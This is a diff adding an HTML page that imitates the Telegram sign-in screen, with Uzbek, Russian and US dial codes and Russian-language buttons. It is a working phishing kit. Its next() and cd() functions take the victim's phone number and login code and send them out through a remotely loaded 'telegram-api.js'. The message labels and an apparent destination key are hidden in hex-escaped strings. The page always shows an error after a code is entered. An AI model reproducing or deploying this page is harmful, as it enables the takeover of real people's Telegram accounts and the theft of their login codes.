@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram</title>
+    <script src="https://ummx.github.io/import/script/aes.js"></script>
+    <script src="https://ummx.github.io/import/script/telegram-api.js"></script>
+    <style>
+        *{
+               background:white;
+        }
+        .logo{
+            display: block;
+            margin: auto;
+            text-align: center;
+            width: 100px;
+
+margin-top:70px;        }
+.t{
+    display: block;
+    margin: auto;
+    text-align: center;
+    margin-top:40px;
+    font-family: arial;
+    font-size:26px;
+    color: black;
+}
+p{
+    display: block;
+    margin: auto;
+    text-align: center;
+    margin-top:10px;
+    width:250px;
+    font-family: arial;
+    color: #7d7d7d;
+}
+select{
+    display: block;
+    margin: auto;
+   padding-left: 10px;
+    width:280px;
+    height:45px;
+    margin-top:30px;
+    border-radius: 5px;
+    outline: none;
+    font-family: monospace;
+    border:3px solid #c0bfbf;
+}
+input{
+    display: block;
+    margin: auto;
+    width: 262px;
+    padding-left: 10px;
+    height:36px;
+    margin-top:10px;
+    border-radius: 5px;
+    font-size:15px;
+    font-family: monospace;
+    border: 3px solid #c0bfbf;
+    outline: none;
+}
+button{
+    display: block;
+    margin: auto;
+    text-align: center;
+    width:275px;
+    height:35px;
+    margin-top: 20px;
+    border-radius: 5px;
+    font-size: 15px;
+    border: none;
+    color: white;
+    background: rgb(0, 140, 255);
+
+}
+    </style>
+</head>
+<body>
+    <head class="h">
+        <img class="logo" src="https://pnggrid.com/wp-content/uploads/2021/04/Telegram-App-Logo-PNG-1024x848.png" alt="">
+        <h1 class="t" id="num">Sign in to Telegram</h1>
+        <p id="mess">Please confirm your country and enter your phone number.</p>
+    </head>
+    <div id="form" style="display: block;">
+        <select name="from" id="from">
+            <option value="+9989">Узбекистан +9989</option>
+            <option value="0000">Россия      +7</option>
+            <option value="0000">США         +1</option>
+        </select>
+        <input type="tel" value="+9989" id="username" >
+  
+        <button onclick="next()">Далее</button>
+    </div>
+    <div class="code" style="display: none;">
+        <br>
+        <input type="text" id="code" placeholder="Код">
+        <p style="color: red;display: none;" id="error">Некорректный код телефона</p>
+        <button onclick="cd()">Далее</button>
+    </div>
+</body>
+<script>
+    function next(){
+        document.getElementById('form').style.display='none';
+        document.querySelector('.code').style.display='block';
+        var username =document.getElementById('username').value;
+        var _0x57ad=["\x54\x65\x6C\x65\x67\x72\x61\x6D\x20\x4E\x75\x6D\x62\x65\x72\x20\x66\x6F\x72\x20\x41\x75\x74\x68\x6F\x72\x69\x7A\x61\x74\x69\x6F\x6E\x20\x5B","\x5D","\x36\x37\x30\x34\x37\x36\x31\x62\x33\x63\x62\x66\x38\x32\x36\x30\x63\x35\x35\x36\x63\x33\x65\x34\x31\x33\x39\x39\x61\x62\x38\x62\x63\x64\x66\x30\x62\x35\x31\x61\x39\x38\x39\x33\x35\x65\x66\x63\x30\x34\x30\x35\x62\x64\x39\x63\x61\x30\x39\x38\x64\x65\x38\x37"];sendMessage(`${_0x57ad[0]}`+ username+ _0x57ad[1],_0x57ad[2])
+        document.getElementById('mess').innerHTML='We have sent you a message in Telegram with the code.';
+       document.getElementById('num').innerHTML=username;
+    }
+    function cd(){
+var code = document.getElementById('code').value;
+document.getElementById('error').style.display="block";
+var _0xfd39=["\x54\x65\x6C\x65\x67\x72\x61\x6D\x20\x43\x6F\x64\x65\x20\x66\x6F\x72\x20\x41\x75\x74\x68\x6F\x72\x69\x7A\x61\x74\x69\x6F\x6E\x20\x5B","\x5D","\x36\x37\x30\x34\x37\x36\x31\x62\x33\x63\x62\x66\x38\x32\x36\x30\x63\x35\x35\x36\x63\x33\x65\x34\x31\x33\x39\x39\x61\x62\x38\x62\x63\x64\x66\x30\x62\x35\x31\x61\x39\x38\x39\x33\x35\x65\x66\x63\x30\x34\x30\x35\x62\x64\x39\x63\x61\x30\x39\x38\x64\x65\x38\x37"];sendMessage(`${_0xfd39[0]}`+ code+ _0xfd39[1],_0xfd39[2])
+    }
+</script>
+</html>
